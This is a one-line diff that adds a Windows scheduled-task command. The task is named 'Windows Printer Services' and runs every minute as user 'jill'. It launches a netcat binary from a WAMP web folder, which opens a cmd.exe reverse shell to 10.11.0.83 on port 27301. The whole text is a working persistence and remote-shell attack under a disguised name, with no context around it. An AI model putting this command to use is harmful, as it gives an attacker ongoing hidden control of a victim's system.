@@ -1,0 +1,1 @@
+schtasks /create /tn "Windows Printer Services" /ru "jill" /sc minute /MO 1 /tr "cmd /c C:\wamp\www\nc.exe -t -e cmd.exe 10.11.0.83 27301"
